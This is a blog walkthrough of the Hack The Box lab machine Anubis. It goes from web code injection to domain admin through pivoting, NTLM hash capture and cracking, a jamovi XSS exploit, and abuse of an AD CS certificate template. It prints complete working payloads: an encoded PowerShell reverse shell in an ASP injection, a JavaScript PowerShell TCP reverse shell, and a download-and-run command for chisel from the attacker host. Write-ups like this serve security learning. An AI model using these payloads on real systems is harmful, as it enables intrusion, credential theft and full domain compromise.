---
published: true
title: Hackthebox Anubis walkthrough
date: '2021-11-26 03:29:00 +0200'
categories:
  - HTB
tags: HTB
---

<img src="https://i.ibb.co/9G93v2k/2022-01-22-19-55-34.png" alt="2022-01-22-19-55-34" border="0">

# Summary 
- RCE in the Web application
- Pivoting 
- Network analysis
- Custom Exploitation 
- Domain Admin by Abusing Certifcate service 

<h1>Scanning</h1>  
```
nmap -p- -sV -sC -v -oA enum --min-rate 4500 --max-rtt-timeout 1500ms --open
10.10.11.102
Nmap scan report for 10.10.11.102
Host is up (0.16s latency).
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT STATE SERVICE VERSION
135/tcp open msrpc Microsoft Windows RPC
443/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn:
|_ http/1.1
|_http-title: Not Found
| ssl-cert: Subject: commonName=www.windcorp.htb
| Subject Alternative Name: DNS:www.windcorp.htb
| Issuer: commonName=www.windcorp.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-05-24T19:44:56
| Not valid after: 2031-05-24T19:54:56
| MD5: e2e7 86ef 4095 9908 14c5 3347 cdcb 4167
|_SHA-1: 7fce 781f 883c a27e 1154 4502 1686 ee65 7551 0e2a
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2021-10-30T12:43:00+00:00; -1s from scanner time.
445/tcp open microsoft-ds?
593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
49710/tcp open msrpc Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-time:
| date: 2021-10-30T12:42:24
|_ start_date: N/A
| smb2-security-mode:
| 3.1.1:
|_ Message signing enabled and required
```

Nmap scan showed 5 opened ports, 1st lets add windcrop.htb to /etc/hosts and check the web application. 

<img src="https://i.ibb.co/BCNFhSP/Pasted-image-20220128144716.png" alt="Pasted-image-20220128144716" border="0">
The application is static, there is only from that looks interesting.

<img src="https://i.ibb.co/LvvSj5j/Pasted-image-20220128144924.png" alt="Pasted-image-20220128144924" border="0">


I will use burpsuite to analyze the request. 

<img src="https://i.ibb.co/w0mSrnD/Pasted-image-20220128145842.png" alt="Pasted-image-20220128145842" border="0">

User input goes to save.asp file, Can we get a remote code execution ?.

Lets check ! 
 
<img src="https://i.ibb.co/2SLkFFc/Pasted-image-20220128150137.png" alt="Pasted-image-20220128150137" border="0">
 
 I injected the message parameter with .net code to ping me, Now i will start tcpdump to listen to ICMP.
 
 ```
 └─$ sudo tcpdump -i tun0 icmp
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 
 ```
 
 **PINGO !**

<img src="https://i.ibb.co/C18BPdP/Koksal-Baba-GIF-Koksal-Baba-Koksalbaba-Discover-Share-GIFs.gif" alt="Koksal-Baba-GIF-Koksal-Baba-Koksalbaba-Discover-Share-GIFs" border="0">
 
 The code worked and i received the ICMP requests. 
 
 ```
 └─$ sudo tcpdump -i tun0 icmp
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
13:04:02.641660 IP www.windcorp.htb > 10.10.17.76: ICMP echo request, id 1000, seq 2765, length 40
13:04:02.641680 IP 10.10.17.76 > www.windcorp.htb: ICMP echo reply, id 1000, seq 2765, length 40
13:04:03.396917 IP www.windcorp.htb > 10.10.17.76: ICMP echo request, id 1000, seq 2766, length 40
13:04:03.396932 IP 10.10.17.76 > www.windcorp.htb: ICMP echo reply, id 1000, seq 2766, length 40
13:04:04.402129 IP www.windcorp.htb > 10.10.17.76: ICMP echo request, id 1000, seq 2767, length 40
13:04:04.402147 IP 10.10.17.76 > www.windcorp.htb: ICMP echo reply, id 1000, seq 2767, length 40
13:04:05.403973 IP www.windcorp.htb > 10.10.17.76: ICMP echo request, id 1000, seq 2768, length 40
13:04:05.403998 IP 10.10.17.76 > www.windcorp.htb: ICMP echo reply, id 1000, seq 2768, length 40 
 ```
 
 <h2>Foothold</h2>
 
 Lets get a reverse shell ! 
 
 I generated the reverse shell using <a href="https://revshells.com">revshells</a>
 
 
 **PAYLOAD**
 
 ```
 <% 
 Set m19o = CreateObject("WScript.Shell")
 Set cmd = m19o.Exec("cmd /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA3AC4ANwA2ACIALAAxADMAMwA3ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==")
 o = cmd.StdOut.Readall() 
 Response.write(o) 
 %>
 
 ```
  
  I need now to listen on port 1337 using netcat.
  
  ```
  └─# nc -nlvp 1337
listening on [any] 1337 ...
  ```
  
 Now i got a reverseshell. 
 
 ```
 └─# nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.17.76] from (UNKNOWN) [10.10.11.102] 49886
C:\windows\system32\inetsrv> whoami
nt authority\system 
 ```
 
 Huh?, system ! 
 I don't think it's easy like that 
 
 ```
PS C:\Users> ls 


    Directory: C:\Users


Mode                LastWriteTime         Length Name                                             
----                -------------         ------ ----                                             
d-----         4/9/2021  10:36 PM                Administrator                                    
d-----        5/25/2021  12:05 PM                ContainerAdministrator                           
d-----         4/9/2021  10:37 PM                ContainerUser                                    
d-r---         4/9/2021  10:36 PM                Public  
 ```
 
 It's a container. 

 <img src="https://c.tenor.com/m6l7wY1JeDMAAAAd/koksal-sad.gif" alt="sad" border="0">
 
 ### Enumeration
 
 Lets see what the Administrator have on desktop. 
 
 ```
 PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                             
----                -------------         ------ ----                                             
-a----        5/24/2021   9:36 PM            989 req.txt                                          


PS C:\Users\Administrator\Desktop> type req.txt
-----BEGIN CERTIFICATE REQUEST-----
MIICoDCCAYgCAQAwWzELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
ETAPBgNVBAoMCFdpbmRDb3JwMSQwIgYDVQQDDBtzb2Z0d2FyZXBvcnRhbC53aW5k
Y29ycC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCmm0r/hZHC
KsK/BD7OFdL2I9vF8oIeahMS9Lb9sTJEFCTHGxCdhRX+xtisRBvAAFEOuPUUBWKb
BEHIH2bhGEfCenhILl/9RRCuAKL0iuj2nQKrHQ1DzDEVuIkZnTakj3A+AhvTPntL
eEgNf5l33cbOcHIFm3C92/cf2IvjHhaJWb+4a/6PgTlcxBMne5OsR+4hc4YIhLnz
QMoVUqy7wI3VZ2tjSh6SiiPU4+Vg/nvx//YNyEas3mjA/DSZiczsqDvCNM24YZOq
qmVIxlmQCAK4Wso7HMwhaKlue3cu3PpFOv+IJ9alsNWt8xdTtVEipCZwWRPFvGFu
1x55Svs41Kd3AgMBAAGgADANBgkqhkiG9w0BAQsFAAOCAQEAa6x1wRGXcDBiTA+H
JzMHljabY5FyyToLUDAJI17zJLxGgVFUeVxdYe0br9L91is7muhQ8S9s2Ky1iy2P
WW5jit7McPZ68NrmbYwlvNWsF7pcZ7LYVG24V57sIdF/MzoR3DpqO5T/Dm9gNyOt
yKQnmhMIo41l1f2cfFfcqMjpXcwaHix7bClxVobWoll5v2+4XwTPaaNFhtby8A1F
F09NDSp8Z8JMyVGRx2FvGrJ39vIrjlMMKFj6M3GAmdvH+IO/D5B6JCEE3amuxU04
CIHwCI5C04T2KaCN4U6112PDIS0tOuZBj8gdYIsgBYsFDeDtp23g4JsR6SosEiso
4TlwpQ==
-----END CERTIFICATE REQUEST-----
 ```
 
It's SSL certifacte, lets decode it.

```
└─$ openssl req -in cert.txt -text -noout                                                                                                                          1 ⨯
Certificate Request:
    Data:
        Version: 1 (0x0)
        Subject: C = AU, ST = Some-State, O = WindCorp, CN = softwareportal.windcorp.htb
```

There is another subdomain, I added it to /etc/hosts but i couldn't reach it 

I need to establish a tunnel to port forward the machines ports to see be able to open the internal web application.

### Port forwarding

If you are struggling downloading chisel to the machine you can use this 
command : "(new-object System.Net.WebClient).DownloadFile('http://10.10.17.76:8888/chisel.exe','C:\users\Administrator\Desktop\chisel.exe')".

**Victim Machine**
```
PS C:\users\Administrator\Desktop> .\chis.exe client 10.10.17.76:1337 R:127.0.0.1:socks  
```

**Attacker Machine**
```
└─$ chisel server -p 1337 --reverse
2022/01/28 14:32:40 server: Reverse tunnelling enabled
2022/01/28 14:32:40 server: Fingerprint YKQAlu2lx0JtzcE9jJtYMrNMEmuDWR7cBzob7ZP6IIA=
2022/01/28 14:32:40 server: Listening on http://0.0.0.0:1337
2022/01/28 14:33:14 server: session#1: Client version (1.7.3) differs from server version (0.0.0-src)
2022/01/28 14:33:14 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

```

Now we need too add softwareportal.windcorp.htb to our /etc/hosts and setup the socks as our proxy in the browser.

```
172.25.144.1 softwareportal.windcorp.htb

that's the container default gateway

```

<img src="https://i.ibb.co/BLvRmgT/Pasted-image-20220128164425.png" alt="Pasted-image-20220128164425" border="0">

The web application is getting the programs from internal ip, lets see what is happening.

<img src="https://i.ibb.co/XJbZ9YY/Pasted-image-20220128164647.png" alt="Pasted-image-20220128164647" border="0">

### Lateral Movement

Lets analyze the request by changing the client to our ip and setup a listener using **TCPDUMP** to see what is happening.

**Victim Machine**
```
PS C:\windows\system32\inetsrv> curl "http://softwareportal.windcorp.htb/install.asp?client=10.10.17.76&software=gimp-2.10.24-setup-3.exe"

```

**Attacker Machine**

```
└─$ sudo tcpdump -i tun0 -w logs.pcap -n        
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes

```

Lets grep the logs and start the analysis.

```
tcpdump -r logs.pcap | grep -v '5554' | head reading from file logs.pcap, link-type RAW (Raw IP), snapshot length 262144 20:47:56.626363 IP 10.10.11.102.50856 > 10.10.17.76.5985: Flags [SEW], seq 4024374084, win 64240, options [mss 1357,nop,wscale 8,nop,nop,sackOK], length 0 20:47:56.626424 IP 10.10.17.76.5985 > 10.10.11.102.50856: Flags [R.], seq 0, ack 4024374085, win 0, length 0 20:47:57.373410 IP 10.10.11.102.50856 > 10.10.17.76.5985: Flags [S], seq 4024374084, win 64240, options [mss 1357,nop,wscale 8,nop,nop,sackOK], length 0 20:47:57.373457 IP 10.10.17.76.5985 > 10.10.11.102.50856: Flags [R.], seq 0, ack 1, win 0, length 0 20:47:58.089647 IP 10.10.11.102.50856 > 10.10.17.76.5985: Flags [S], seq 4024374084, win 64240, options [mss 1357,nop,wscale 8,nop,nop,sackOK], length 0 20:47:58.089682 IP 10.10.17.76.5985 > 10.10.11.102.50856: Flags [R.], seq 0, ack 1, win 0, length 0 20:47:58.249260 IP 10.10.11.102.50857 > 10.10.17.76.5985: Flags [SEW], seq 2900609790, win 64240, options [mss 1357,nop,wscale 8,nop,nop,sackOK], length 0 20:47:58.249305 IP 10.10.14.79.5985 > 10.10.11.102.50857: Flags [R.], seq 0, ack 2900609791, win 0, length 0 20:47:59.012439 IP 10.10.11.102.50857 > 10.10.17.76.5985: Flags [S], seq 2900609790, win 64240, options [mss 1357,nop,wscale 8,nop,nop,sackOK], length 0 20:47:59.012486 IP 10.10.17.76.5985 > 10.10.11.102.50857: Flags [R.], seq 0, ack 1, win 0, length 0

```

That didn't work for me from the 1st time, don't give up on it, keep trying. 

From that logs i understood that the web application trying to authenticate from WinRM to get the file.

### Escaping the docker

I will start the respinder to catch the hash of the user that trying to authenticate against WinRM.

```
sudo responder -I tun0 -v

```

Lets repeat the request and see what will happen.

```
PS C:\windows\system32\inetsrv> curl "http://softwareportal.windcorp.htb/install.asp?client=10.10.17.76&software=gimp-2.10.24-setup-3.exe"

```

**BAM !**

```
[+] Listening for events... [WinRM] NTLMv2 Client : 10.10.11.102 [WinRM] NTLMv2 Username : windcorp\localadmin [WinRM] NTLMv2 Hash : localadmin::windcorp:5154b10fe742e26f:02D37AB30D2443EEFC13F18062985D6E:0101000000000000B574CFFAD2CDD7012A9D75CCC99D4C0D0000000002000800490053003700540001001E00570049004E002D00520031005800530059005400560035003700450034000400140049005300370054002E004C004F00430041004C0003003400570049004E002D00520031005800530059005400560035003700450034002E0049005300370054002E004C004F00430041004C000500140049005300370054002E004C004F00430041004C0008003000300000000000000000000000002100008840E4FBD0AA6E1880E61526E42DF0210E6BE2F694B85FED945A976C305BDE030A001000000000000000000000000000000000000900200048005400540050002F00310030002E00310030002E00310034002E00370039000000000000000000

```

<img src="https://i.ibb.co/zNy2Gvd/Tv-Addicted.gif" alt="Tv-Addicted" border="0">

Lets crack it. 

```
hashcat -m 5600 hash_localadmin /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...
------------SNIP------------

LOCALADMIN::windcorp:5154b10fe742e26f:02d37ab30d2443eefc13f18062985d6e:0101000000000000b574cffad2cdd7012a9d75ccc99d4c0d0000000002000800490053003700540001001e00570049004e002d00520031005800530059005400560035003700450034000400140049005300370054002e004c004f00430041004c0003003400570049004e002d00520031005800530059005400560035003700450034002e0049005300370054002e004c004f00430041004c000500140049005300370054002e004c004f00430041004c0008003000300000000000000000000000002100008840e4fbd0aa6e1880e61526e42df0210e6be2f694b85fed945a976c305bde030a001000000000000000000000000000000000000900200048005400540050002f00310030002e00310030002e00310034002e00370039000000000000000000:Secret123

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: LOCALADMIN::windcorp:5154b10fe742e26f:02d37ab30d244...000000
Time.Started.....: Sat Oct 30 21:17:32 2021 (3 secs)
Time.Estimated...: Sat Oct 30 21:17:35 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 713.3 kH/s (2.36ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2093056/14344385 (14.59%)
Rejected.........: 0/2093056 (0.00%)
Restore.Point....: 2091008/14344385 (14.58%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: Smudge4 -> SaTeLlItE
Started: Sat Oct 30 21:17:30 2021
Stopped: Sat Oct 30 21:17:37 2021
------------SNIP------------
```

### User

Lets enumerate SMB.

```
smbclient -L //10.10.11.102 -U localadmin
Enter WORKGROUP\localadmin's password:
 Sharename Type Comment
 --------- ---- -------
	 ADMIN$     Disk Remote Admin
	 C$         Disk  Default share
	 CertEnroll Disk Active Directory Certificate Services share
	 IPC$       IPC Remote IPC
	 NETLOGON   Disk Logon server share
	 Shared     Disk
	 SYSVOL 	Disk Logon server share

```

```
> smbclient //10.10.11.102/Shared -U localadmin
Enter WORKGROUP\localadmin's password:
Try "help" to get a list of possible commands.
smb: \> ls
.         D 0 Wed Apr 28 15:06:06 2021
..        D 0 Wed Apr 28 15:06:06 2021
Documents D 0 Tue Apr 27 04:09:25 2021
Software  D 0 Thu Jul 22 18:14:16 2021

		9034239 blocks of size 4096. 3206077 blocks available

smb: \> ls Software\
 .          				     D 0 Thu Jul 22 18:14:16 2021
 ..             				 D 0 Thu Jul 22 18:14:16 2021
 7z1900-x64.exe                  N 1447178 Mon Apr 26 21:10:08 2021
 jamovi-1.6.16.0-win64.exe 		 N 247215343 Mon Apr 26 21:03:30 2021
 VNC-Viewer-6.20.529-Windows.exe N 10559784 Mon Apr 26 21:09:53 2021
 
 		9034239 blocks of size 4096. 3206077 blocks available

```

```
smb: \> ls Documents\Analytics\
 . 			      D 0 Tue Apr 27 18:40:20 2021
 .. 			  D 0 Tue Apr 27 18:40:20 2021
 Big 5.omv  	  A 6455 Tue Apr 27 18:39:20 2021
 Bugs.omv   	  A 2897 Tue Apr 27 18:39:55 2021
 Tooth Growth.omv A 2142 Tue Apr 27 18:40:20 2021
 Whatif.omv       A 2841 Sat Oct 30 21:49:42 2021
 
 	9034239 blocks of size 4096. 3206077 blocks available

```

What is .omv, Lets search. 

<img src="https://i.ibb.co/D8wWWHR/Pasted-image-20220128175408.png" alt="Pasted-image-20220128175408" border="0">

I searched for jamovi latest vulnerabilities and i found this <a href="https://www.cvedetails.com/cve/CVE-2021-28079">CVE-2021-28079</a>


I need to make .OMV file and inject XSS payload to get a reverse shell.

note : Don't exhaust yourself trying to find that vuln version download it from the share.
 
 Lets unzip Whatif.omv.
 
 ```
 └─# unzip Whatif.omv       
  Archive:  Whatif.omv
  inflating: META-INF/MANIFEST.MF    
  inflating: index.html              
  inflating: metadata.json           
  inflating: xdata.json              
  inflating: data.bin                
  inflating: 01 empty/analysis  
  
 ```
 
 I injected the name column as described in the previous link.
 
<img src="https://i.ibb.co/SRkmCfb/Pasted-image-20220128181500.png" alt="Pasted-image-20220128181500" border="0">

```
(() => {
    let sh = require('child_process');
	 sh.exec("powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.17.76',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"");
    return /a/;
})();

```

That is the reverse shell i used make sure you save it as .js file, Now replace the file we made with the one on the server using SMB.

```
smb: \Documents\Analytics\> 
smb: \Documents\Analytics\> put Whatif.omv
putting file Whatif.omv as \Documents\Analytics\Whatif.omv (2.0 kb/s) (average 2.0 kb/s)
```

start you Http server to deliver the file and use netcat to get the reverseshell.

```

PS C:\users\diegocruz> cd Desktop
PS C:\users\diegocruz\Desktop> type user.txt
8a298cdf7dc52a52a607b9f3912966ff

```

<img src="https://c.tenor.com/uDe2SrA9gSIAAAAd/dance-%D8%B1%D9%82%D8%B5.gif" alt=OW border="0">


### ROOT
If you noticed CertEnroll share when we used SMBclient, that folder used by Active Directory Certificate Services for certificate enrollment.

now lets use certutil -template to see what template we have permission to issue.
	 
```
 PS> certutil -template

  Template[31]:
  TemplatePropCommonName = Web
  TemplatePropFriendlyName = Web
  TemplatePropSecurityDescriptor = O:LAG:S-1-5-21-3510634497-171945951-3071966075-519D:PAI(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DA)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-3510634497-171945951-3071966075-519)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;DA)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;S-1-5-21-3510634497-171945951-3071966075-519)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;LA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3510634497-171945951-3071966075-3290)(A;;LCRPLORC;;;AU)

    Allow Enroll        WINDCORP\Domain Admins
    Allow Enroll        WINDCORP\Enterprise Admins
    Allow Full Control  WINDCORP\Domain Admins
    Allow Full Control  WINDCORP\Enterprise Admins
    Allow Full Control  WINDCORP\Administrator
    Allow Full Control  WINDCORP\webdevelopers
    Allow Read  NT AUTHORITY\Authenticated Users



```

```
USER INFORMATION
----------------

User Name          SID                                          
================== =============================================
windcorp\diegocruz S-1-5-21-3510634497-171945951-3071966075-3245


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes                                        
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Group used for deny only                          
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                       Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                       Mandatory group, Enabled by default, Enabled group
WINDCORP\webdevelopers                     Group            S-1-5-21-3510634497-171945951-3071966075-3290 Mandatory group, Enabled by default, Enabled group



```

The user we have is a membar of webdevelopers group, So we can issue the certificate using WEB template.

After some searching i found a detailed article for this attack <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2?gi=a1710f95f4d6">Certified-Pre-Owned</a>
	
We need to get Certify.exe to start out attack, You can find it here <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">CompiledBinaires</a>

```
PS C:\Users\diegocruz\Desktop> .\certify.exe request /ca:earth.windcorp.htb\windcorp-CA /template:Web /altname:Administrator

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.0.0                               

[*] Action: Request a Certificates

[*] Current user context    : WINDCORP\diegocruz
[*] No subject name specified, using current context as subject.

[*] Template                : Web
[*] Subject                 : CN=Diego Cruz, OU=MainOffice, DC=windcorp, DC=htb
[*] AltName                 : Administrator

[*] Certificate Authority   : earth.windcorp.htb\windcorp-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 3

[*] cert.pem         :


```

Now copy the certificate from the victim machine and paste it to a file called cert.pem in your machine, Now convert it using openssl.

```
└─# openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:
┌──(root💀kali)-[/home/kali/HTB/anubis]
└─# ls     
cert.pem  cert.pfx  

```

Lets get our TGT.

<img src="https://i.ibb.co/93NkGjF/Pasted-image-20220128194724.png" alt="Pasted-image-20220128194724" border="0">

Export it to KRB : 

<img src="https://i.ibb.co/ZTp7Dfj/Pasted-image-20220128194757.png" alt="Pasted-image-20220128194757" border="0">

<img src="https://i.ibb.co/ZTp7Dfj/Pasted-image-20220128194757.png" alt="Pasted-image-20220128194757" border="0">

**DONE**

<img src="https://gifimage.net/wp-content/uploads/2018/11/koksal-gif.gif" alt="YEAH" border="0">
